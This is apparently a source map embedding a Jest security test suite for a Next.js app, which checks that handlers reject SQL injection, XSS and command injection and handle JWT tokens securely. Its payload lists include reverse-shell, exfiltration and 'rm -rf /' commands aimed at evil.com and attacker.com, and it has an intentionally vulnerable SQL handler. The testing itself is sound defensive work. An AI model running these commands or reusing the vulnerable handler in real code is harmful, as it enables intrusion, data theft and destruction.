{"version":3,"sources":["/Users/sachin/Documents/md-sports-/tests/security/security.test.ts"],"sourcesContent":["import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';\n// Import real jsonwebtoken for security tests\nconst jwt = require('jsonwebtoken');\nimport bcrypt from 'bcryptjs';\nimport crypto from 'crypto';\n\n// Mock NextResponse\nconst NextResponse = {\n  json: (data: any, init?: ResponseInit) => ({\n    json: async () => data,\n    status: init?.status || 200,\n    headers: new Headers(init?.headers),\n  }),\n  redirect: (url: string, status?: number) => ({\n    status: status || 302,\n    headers: new Headers({ Location: url }),\n  }),\n};\n\n// Helper function to create mock NextRequest\nconst createMockNextRequest = (url: string, options: {\n  method?: string;\n  body?: any;\n  headers?: Record<string, string>;\n} = {}): any => {\n  const { method = 'GET', body, headers = {} } = options;\n  return {\n    method,\n    url,\n    headers: new Headers(headers),\n    json: async () => body ? (typeof body === 'string' ? JSON.parse(body) : body) : {},\n    text: async () => body ? (typeof body === 'string' ? body : JSON.stringify(body)) : '',\n  };\n};\n\n// Security test utilities\nclass SecurityTestUtils {\n  static generateSQLInjectionPayloads(): string[] {\n    return [\n      \"'; DROP TABLE users; --\",\n      \"' OR '1'='1\",\n      \"' UNION SELECT * FROM users --\",\n      \"'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --\",\n      \"' OR 1=1 --\",\n      \"admin'--\",\n      \"admin'/*\",\n      \"' OR 'x'='x\",\n      \"') OR ('1'='1\",\n      \"' OR 1=1#\",\n    ];\n  }\n\n  static generateXSSPayloads(): string[] {\n    return [\n      \"<script>alert('XSS')</script>\",\n      \"javascript:alert('XSS')\",\n      \"<img src=x onerror=alert('XSS')>\",\n      \"<svg onload=alert('XSS')>\",\n      \"<iframe src=javascript:alert('XSS')></iframe>\",\n      \"<body onload=alert('XSS')>\",\n      \"<input onfocus=alert('XSS') autofocus>\",\n      \"<select onfocus=alert('XSS') autofocus>\",\n      \"<textarea onfocus=alert('XSS') autofocus>\",\n      \"<keygen onfocus=alert('XSS') autofocus>\",\n    ];\n  }\n\n  static generateCommandInjectionPayloads(): string[] {\n    return [\n      \"; ls -la\",\n      \"| cat /etc/passwd\",\n      \"&& rm -rf /\",\n      \"; cat /etc/shadow\",\n      \"| nc -l 4444\",\n      \"; wget http://evil.com/malware\",\n      \"&& curl http://evil.com/steal-data\",\n      \"; python -c 'import os; os.system(\\\"rm -rf /\\\")'\",\n      \"| bash -i >& /dev/tcp/attacker.com/8080 0>&1\",\n      \"; /bin/bash\",\n    ];\n  }\n\n  static generateLongStrings(): string[] {\n    return [\n      'A'.repeat(1000),\n      'A'.repeat(10000),\n      'A'.repeat(100000),\n      '\\x00'.repeat(1000), // Null bytes\n      '\\n'.repeat(1000), // Newlines\n      '\\r'.repeat(1000), // Carriage returns\n    ];\n  }\n\n  static generateInvalidTokens(): string[] {\n    return [\n      'invalid.token.here',\n      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',\n      '', // Empty token\n      'Bearer', // Just Bearer\n      'null',\n      'undefined',\n      '{}',\n      'admin',\n      '../../etc/passwd',\n      '<script>alert(\"xss\")</script>',\n    ];\n  }\n\n  static async hashPassword(password: string): Promise<string> {\n    return bcrypt.hash(password, 10);\n  }\n\n  static generateValidJWT(payload: any, secret: string = 'test-secret'): string {\n    try {\n      const token = jwt.sign(payload, secret, { expiresIn: '1h' });\n      return token || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTYzMDAwMDAwMCwiZXhwIjoxNjMwMDAzNjAwfQ.test-signature';\n    } catch (error) {\n      // Fallback for mocked environment\n      return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTYzMDAwMDAwMCwiZXhwIjoxNjMwMDAzNjAwfQ.test-signature';\n    }\n  }\n\n  static generateExpiredJWT(payload: any, secret: string = 'test-secret'): string {\n    try {\n      const token = jwt.sign(payload, secret, { expiresIn: '-1h' });\n      return token || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTYzMDAwMDAwMCwiZXhwIjoxNjI5OTk2NDAwfQ.expired-signature';\n    } catch (error) {\n      // Fallback for mocked environment\n      return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTYzMDAwMDAwMCwiZXhwIjoxNjI5OTk2NDAwfQ.expired-signature';\n    }\n  }\n}\n\n// Mock API handlers for security testing\nconst mockPrisma = {\n  user: {\n    findUnique: jest.fn(),\n    findMany: jest.fn(),\n    create: jest.fn(),\n    update: jest.fn(),\n  },\n  product: {\n    findMany: jest.fn(),\n    create: jest.fn(),\n  },\n  $queryRaw: jest.fn(),\n  $executeRaw: jest.fn(),\n};\n\n// Mock vulnerable endpoint for testing\nconst vulnerableSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Simulate SQL injection vulnerability (for testing purposes)\n  try {\n    // This would be vulnerable in real code - DON'T DO THIS\n    const results = await mockPrisma.$queryRaw`\n      SELECT * FROM products WHERE name LIKE '%${query}%'\n    `;\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Secure search handler for comparison\nconst secureSearchHandler = async (req: NextRequest) => {\n  const url = new URL(req.url);\n  const query = url.searchParams.get('q');\n  \n  if (!query) {\n    return NextResponse.json({ error: 'Query required' }, { status: 400 });\n  }\n\n  // Input validation\n  if (query.length > 100) {\n    return NextResponse.json({ error: 'Query too long' }, { status: 400 });\n  }\n\n  // Check for suspicious SQL injection patterns\n  const suspiciousPatterns = [\n    /drop\\s+table/i,\n    /union\\s+select/i,\n    /insert\\s+into/i,\n    /delete\\s+from/i,\n    /update\\s+.*set/i,\n    /or\\s+['\"]*1['\"]*\\s*=\\s*['\"]*1['\"]*?/i,\n    /or\\s+['\"]*x['\"]*\\s*=\\s*['\"]*x['\"]*?/i,\n    /\\)\\s*or\\s*\\(/i,\n    /admin['\"]*--/i,\n    /admin['\"]*\\/\\*/i,\n    /--/,\n    /\\/\\*/,\n    /#/\n  ];\n\n  const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(query));\n  \n  if (isSuspicious) {\n    return NextResponse.json({ error: 'Invalid query detected' }, { status: 400 });\n  }\n\n  // Sanitize input\n  const sanitizedQuery = query.replace(/[<>\"'&]/g, '');\n  \n  try {\n    // Use parameterized queries\n    const results = await mockPrisma.product.findMany({\n      where: {\n        name: {\n          contains: sanitizedQuery,\n          mode: 'insensitive',\n        },\n      },\n    });\n    \n    return NextResponse.json({ results });\n  } catch (error) {\n    return NextResponse.json({ error: 'Database error' }, { status: 500 });\n  }\n};\n\n// Authentication handler with security measures\nconst secureAuthHandler = async (req: NextRequest) => {\n  const body = await req.json();\n  const { email, password } = body;\n\n  // Rate limiting simulation\n  const clientIP = req.headers.get('x-forwarded-for') || 'unknown';\n  \n  // Input validation\n  if (!email || !password) {\n    return NextResponse.json(\n      { error: 'Email and password are required' },\n      { status: 400 }\n    );\n  }\n\n  if (email.length > 254 || password.length > 128) {\n    return NextResponse.json(\n      { error: 'Input too long' },\n      { status: 400 }\n    );\n  }\n\n  // Check for suspicious patterns first\n  const suspiciousPatterns = [\n    /<script/i,\n    /javascript:/i,\n    /on\\w+=/i,\n    /\\bor\\b.*\\b1\\s*=\\s*1\\b/i,\n    /union.*select/i,\n    /drop.*table/i,\n    /\\bor\\b.*['\"]*x['\"]*\\s*=\\s*['\"]*x['\"]*\\b/i,\n    /['\"]*\\s*or\\s*['\"]*1['\"]*\\s*=\\s*['\"]*1/i,\n    /\\)\\s*or\\s*\\(/i,\n    /admin['\"]*--/i,\n    /admin['\"]*\\/\\*/i,\n  ];\n\n  const isSuspicious = suspiciousPatterns.some(pattern => \n    pattern.test(email) || pattern.test(password)\n  );\n\n  if (isSuspicious) {\n    return NextResponse.json(\n      { error: 'Invalid input detected' },\n      { status: 400 }\n    );\n  }\n\n  // Email format validation\n  const emailRegex = /^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?@[a-zA-Z0-9]([a-zA-Z0-9.-]*[a-zA-Z0-9])?\\.[a-zA-Z]{2,}$/;\n  const hasControlChars = /[\\x00-\\x1F\\x7F]/.test(email) || /[\\x00-\\x1F\\x7F]/.test(password);\n  const hasConsecutiveDots = /\\.{2,}/.test(email);\n  \n  if (!emailRegex.test(email) || hasControlChars || hasConsecutiveDots) {\n    return NextResponse.json(\n      { error: 'Invalid email format' },\n      { status: 400 }\n    );\n  }\n\n  try {\n    const user = await mockPrisma.user.findUnique({\n      where: { email },\n    });\n\n    if (!user) {\n      // Constant time delay to prevent timing attacks\n      await new Promise(resolve => setTimeout(resolve, 100));\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    const isValid = await bcrypt.compare(password, user.password);\n    if (!isValid) {\n      return NextResponse.json(\n        { error: 'Invalid credentials' },\n        { status: 401 }\n      );\n    }\n\n    // Generate secure token\n    const token = jwt.sign(\n      { \n        userId: user.id, \n        email: user.email,\n        iat: Math.floor(Date.now() / 1000),\n      },\n      'test-secret',\n      { \n        expiresIn: '15m',\n        issuer: 'md-sports',\n        audience: 'md-sports-client',\n      }\n    );\n\n    return NextResponse.json({\n      user: {\n        id: user.id,\n        email: user.email,\n        name: user.name,\n      },\n      token,\n    });\n  } catch (error) {\n    return NextResponse.json(\n      { error: 'Internal server error' },\n      { status: 500 }\n    );\n  }\n};\n\ndescribe('Security Tests', () => {\n  beforeAll(() => {\n    process.env.JWT_SECRET = 'test-secret-key-for-security-testing';\n  });\n\n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('SQL Injection Protection', () => {\n    it('should prevent SQL injection in search queries', async () => {\n      const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();\n      \n      for (const payload of sqlPayloads) {\n        const request = createMockNextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        // Test with secure handler\n        const response = await secureSearchHandler(request);\n        \n        // Should not return 500 error or expose database structure\n        expect(response.status).not.toBe(500);\n        \n        const data = await response.json();\n        expect(data).not.toHaveProperty('results');\n      }\n    });\n\n    it('should use parameterized queries', async () => {\n      mockPrisma.product.findMany.mockResolvedValue([]);\n      \n      const request = createMockNextRequest(\n        \"http://localhost:3000/api/search?q=test%22%27%3C%3E%26input\"\n      );\n\n      await secureSearchHandler(request);\n      \n      // Verify parameterized query was used\n      expect(mockPrisma.product.findMany).toHaveBeenCalledWith({\n        where: {\n          name: {\n            contains: \"testinput\", // Sanitized (removes \"'<>&)\n            mode: 'insensitive',\n          },\n        },\n      });\n    });\n  });\n\n  describe('XSS Protection', () => {\n    it('should sanitize XSS payloads in input', async () => {\n      const xssPayloads = SecurityTestUtils.generateXSSPayloads();\n      \n      for (const payload of xssPayloads) {\n        const request = createMockNextRequest(\n          `http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`\n        );\n\n        const response = await secureSearchHandler(request);\n        const data = await response.json();\n        \n        // Should not contain script tags or javascript\n        if (data.results) {\n          const responseStr = JSON.stringify(data);\n          expect(responseStr).not.toMatch(/<script/i);\n          expect(responseStr).not.toMatch(/javascript:/i);\n          expect(responseStr).not.toMatch(/on\\w+=/i);\n        }\n      }\n    });\n\n    it('should reject suspicious input patterns', async () => {\n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: '<script>alert(\"xss\")</script>@test.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(400);\n      expect(data.error).toBe('Invalid input detected');\n    });\n  });\n\n  describe('Authentication Security', () => {\n    const testSecret = 'test-secret';\n    \n    it('should reject invalid JWT tokens', async () => {\n      const invalidTokens = SecurityTestUtils.generateInvalidTokens();\n      \n      for (const token of invalidTokens) {\n        expect(() => {\n          jwt.verify(token, testSecret);\n        }).toThrow();\n      }\n    });\n\n    it('should reject expired tokens', async () => {\n      const expiredToken = SecurityTestUtils.generateExpiredJWT({\n        userId: 1,\n        email: 'test@example.com',\n      }, testSecret);\n      \n      expect(() => {\n        jwt.verify(expiredToken, testSecret);\n      }).toThrow('jwt expired');\n    });\n\n    it('should use secure password hashing', async () => {\n      const password = 'testpassword123';\n      const hash = await SecurityTestUtils.hashPassword(password);\n      \n      // Should be bcrypt hash\n      expect(hash).toMatch(/^\\$2[aby]\\$\\d+\\$/);\n      \n      // Should not be the original password\n      expect(hash).not.toBe(password);\n      \n      // Should verify correctly\n      const isValid = await bcrypt.compare(password, hash);\n      expect(isValid).toBe(true);\n      \n      // Should not verify with wrong password\n      const isInvalid = await bcrypt.compare('wrongpassword', hash);\n      expect(isInvalid).toBe(false);\n    });\n\n    it('should prevent timing attacks in authentication', async () => {\n      const validEmail = 'test@example.com';\n      const invalidEmail = 'nonexistent@example.com';\n      \n      // Mock user lookup\n      mockPrisma.user.findUnique.mockImplementation(({ where }) => {\n        if (where.email === validEmail) {\n          return Promise.resolve({\n            id: 1,\n            email: validEmail,\n            password: '$2a$10$hashedPassword',\n            name: 'Test User',\n          });\n        }\n        return Promise.resolve(null);\n      });\n\n      const validRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: validEmail,\n          password: 'wrongpassword',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const invalidRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: invalidEmail,\n          password: 'wrongpassword',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      // Measure response times\n      const start1 = Date.now();\n      const response1 = await secureAuthHandler(validRequest);\n      const time1 = Date.now() - start1;\n\n      const start2 = Date.now();\n      const response2 = await secureAuthHandler(invalidRequest);\n      const time2 = Date.now() - start2;\n\n      // Both should return 401\n      expect(response1.status).toBe(401);\n      expect(response2.status).toBe(401);\n      \n      // Response times should be similar (within 200ms)\n      expect(Math.abs(time1 - time2)).toBeLessThan(200);\n    });\n  });\n\n  describe('Input Validation', () => {\n    it('should reject oversized inputs', async () => {\n      const longStrings = SecurityTestUtils.generateLongStrings();\n      \n      for (const longString of longStrings) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: longString,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n\n    it('should validate email format', async () => {\n      const invalidEmails = [\n        'invalid-email',\n        '@domain.com',\n        'user@',\n        'user..name@domain.com',\n        'user@domain',\n        'user name@domain.com',\n      ];\n      \n      // Test empty email separately as it triggers a different error\n      const emptyEmailRequest = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: '',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n      \n      const emptyEmailResponse = await secureAuthHandler(emptyEmailRequest);\n      const emptyEmailData = await emptyEmailResponse.json();\n      \n      expect(emptyEmailResponse.status).toBe(400);\n      expect(emptyEmailData.error).toBe('Email and password are required');\n      \n      for (const email of invalidEmails) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        const data = await response.json();\n        \n        expect(response.status).toBe(400);\n        expect(data.error).toBe('Invalid email format');\n      }\n    });\n\n    it('should handle null bytes and special characters', async () => {\n      const maliciousInputs = [\n        'test\\x00@example.com',\n        'test\\r\\n@example.com',\n        'test\\t@example.com',\n        'test\\b@example.com',\n      ];\n      \n      for (const input of maliciousInputs) {\n        const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: input,\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n          },\n        });\n\n        const response = await secureAuthHandler(request);\n        \n        expect(response.status).toBe(400);\n      }\n    });\n  });\n\n  describe('Command Injection Protection', () => {\n    it('should prevent command injection in file operations', () => {\n      const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();\n      \n      for (const payload of commandPayloads) {\n        // Simulate file name validation\n        const isValidFileName = (filename: string): boolean => {\n          // Only allow alphanumeric, dots, hyphens, and underscores\n          return /^[a-zA-Z0-9._-]+$/.test(filename);\n        };\n        \n        expect(isValidFileName(payload)).toBe(false);\n      }\n    });\n  });\n\n  describe('JWT Security', () => {\n    const testSecret = 'test-secret';\n    \n    it('should use secure JWT configuration', () => {\n      const payload = { userId: 1, email: 'test@example.com' };\n      const secret = 'test-secret';\n      \n      const token = SecurityTestUtils.generateValidJWT(payload, secret);\n      expect(token).toBeDefined();\n      expect(typeof token).toBe('string');\n      \n      const decoded = jwt.verify(token, secret) as any;\n      \n      expect(decoded.userId).toBe(1);\n      expect(decoded.email).toBe('test@example.com');\n      expect(decoded.iat).toBeDefined();\n      expect(decoded.exp).toBeDefined();\n    });\n\n    it('should not accept tokens with none algorithm', () => {\n      // Create a token with 'none' algorithm (security vulnerability)\n      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');\n      const payload = Buffer.from(JSON.stringify({ userId: 1, email: 'test@example.com' })).toString('base64');\n      const noneToken = `${header}.${payload}.`;\n      \n      expect(() => {\n        jwt.verify(noneToken, testSecret, { algorithms: ['HS256'] });\n      }).toThrow();\n    });\n\n    it('should validate token signature', () => {\n      const validToken = SecurityTestUtils.generateValidJWT({ userId: 1 }, testSecret);\n      expect(validToken).toBeDefined();\n      expect(typeof validToken).toBe('string');\n      \n      const [header, payload, signature] = validToken.split('.');\n      const tamperedToken = `${header}.${payload}.tampered_signature`;\n      \n      expect(() => {\n        jwt.verify(tamperedToken, testSecret);\n      }).toThrow();\n    });\n  });\n\n  describe('Rate Limiting Simulation', () => {\n    it('should handle rapid successive requests', async () => {\n      const requests = Array.from({ length: 100 }, () => \n        createMockNextRequest('http://localhost:3000/api/auth/login', {\n          method: 'POST',\n          body: {\n            email: 'test@example.com',\n            password: 'password123',\n          },\n          headers: {\n            'Content-Type': 'application/json',\n            'X-Forwarded-For': '192.168.1.100',\n          },\n        })\n      );\n\n      // In a real implementation, this would trigger rate limiting\n      const responses = await Promise.all(\n        requests.map(req => secureAuthHandler(req))\n      );\n\n      // All requests should be processed (in real app, some would be rate limited)\n      responses.forEach(response => {\n        expect([400, 401, 429]).toContain(response.status); // 429 = Too Many Requests\n      });\n    });\n  });\n\n  describe('Error Handling Security', () => {\n    it('should not expose sensitive information in error messages', async () => {\n      // Simulate database error\n      mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database \"md_sports\" on host \"localhost\"'));\n      \n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: 'test@example.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(500);\n      expect(data.error).toBe('Internal server error');\n      expect(data.error).not.toContain('database');\n      expect(data.error).not.toContain('localhost');\n      expect(data.error).not.toContain('md_sports');\n    });\n\n    it('should use generic error messages for authentication failures', async () => {\n      mockPrisma.user.findUnique.mockResolvedValue(null);\n      \n      const request = createMockNextRequest('http://localhost:3000/api/auth/login', {\n        method: 'POST',\n        body: {\n          email: 'nonexistent@example.com',\n          password: 'password123',\n        },\n        headers: {\n          'Content-Type': 'application/json',\n        },\n      });\n\n      const response = await secureAuthHandler(request);\n      const data = await response.json();\n      \n      expect(response.status).toBe(401);\n      expect(data.error).toBe('Invalid credentials');\n      expect(data.error).not.toContain('user not found');\n      expect(data.error).not.toContain('email');\n    });\n  });\n});"],"names":["jwt","require","NextResponse","json","data","init","status","headers","Headers","redirect","url","Location","createMockNextRequest","options","method","body","JSON","parse","text","stringify","SecurityTestUtils","generateSQLInjectionPayloads","generateXSSPayloads","generateCommandInjectionPayloads","generateLongStrings","repeat","generateInvalidTokens","hashPassword","password","bcrypt","hash","generateValidJWT","payload","secret","token","sign","expiresIn","error","generateExpiredJWT","mockPrisma","user","findUnique","jest","fn","findMany","create","update","product","$queryRaw","$executeRaw","vulnerableSearchHandler","req","URL","query","searchParams","get","results","secureSearchHandler","length","suspiciousPatterns","isSuspicious","some","pattern","test","sanitizedQuery","replace","where","name","contains","mode","secureAuthHandler","email","clientIP","emailRegex","hasControlChars","hasConsecutiveDots","Promise","resolve","setTimeout","isValid","compare","userId","id","iat","Math","floor","Date","now","issuer","audience","describe","beforeAll","process","env","JWT_SECRET","beforeEach","clearAllMocks","it","sqlPayloads","request","encodeURIComponent","response","expect","not","toBe","toHaveProperty","mockResolvedValue","toHaveBeenCalledWith","xssPayloads","responseStr","toMatch","testSecret","invalidTokens","verify","toThrow","expiredToken","isInvalid","validEmail","invalidEmail","mockImplementation","validRequest","invalidRequest","start1","response1","time1","start2","response2","time2","abs","toBeLessThan","longStrings","longString","invalidEmails","emptyEmailRequest","emptyEmailResponse","emptyEmailData","maliciousInputs","input","commandPayloads","isValidFileName","filename","toBeDefined","decoded","exp","header","Buffer","from","alg","typ","toString","noneToken","algorithms","validToken","signature","split","tamperedToken","requests","Array","responses","all","map","forEach","toContain","mockRejectedValue","Error"],"mappings":"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